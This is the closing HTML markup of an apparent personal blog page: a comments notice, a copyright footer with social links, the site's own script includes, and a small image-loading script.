                   }</script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript></div></div></main><footer id="copyright"><p><span style="color: #e03e2d;"><span style="color: #95a5a6;">Copyright ©</span> <span style="color: #7e8c8d;"><a href="https://sakibulalikhan.github.io/" title="Sakibul Ali Khan" style="color: #7e8c8d;">Sakibul Ali Khan</a>. </span></span><span style="color: #2dc26b;"><span style="color: #95a5a6;">Follow Me On</span>: </span><span style="color: #e03e2d;"><span style="color: #7e8c8d;"><a href="https://twitter.com/sakibulalikhan" title="Twitter" target="_blank" style="color: #7e8c8d;" rel="noopener">Twitter  </a></span><span style="color: #95a5a6;">&amp;</span> <span style="color: #ced4d9;"><a href="https://www.linkedin.com/in/sakibulalikhan/" title="linkedin" target="_blank" style="color: #ced4d9;" rel="noopener"><span style="color: #7e8c8d;">linkedin</span> </a></span><span style="color: #95a5a6;">&amp;</span><span style="color: #7e8c8d;"> <a href="https://github.com/sakibulalikhan" title="Github" target="_blank" rel="noopener" style="color: #7e8c8d;">Github</a>.</span></span></p></footer></div><script src="https://sakibulalikhan.github.io/blog/assets/js/jquery.min.js?v=7c14a783dfeb3d238ccd3edd840d82ee"></script><script src="https://sakibulalikhan.github.io/blog/assets/js/jquery.scrollex.min.js?v=f89065e3d988006af9791b44561d7c90"></script><script src="https://sakibulalikhan.github.io/blog/assets/js/jquery.scrolly.min.js?v=1ed5a78bde1476875a40f6b9ff44fc14"></script><script src="https://sakibulalikhan.github.io/blog/assets/js/browser.min.js?v=c07298dd19048a8a69ad97e754dfe8d0"></script><script src="https://sakibulalikhan.github.io/blog/assets/js/breakpoints.min.js?v=81a479eb099e3b187613943b085923b8"></script><script src="https://sakibulalikhan.github.io/blog/assets/js/util.min.js?v=4201a626f8c9b614a663b3a1d7d82615"></script><script src="https://sakibulalikhan.github.io/blog/assets/js/main.min.js?v=149e72e3ae18744a477b480b19e0c6da"></script><script>/*<![CDATA[*/var images=document.querySelectorAll("img[loading]");for(var i=0;i<images.length;i++){if(images[i].complete){images[i].classList.add("is-loaded")}else{images[i].addEventListener("load",function(){this.classList.add("is-loaded")},false)}};/*]]>*/</script></body></html>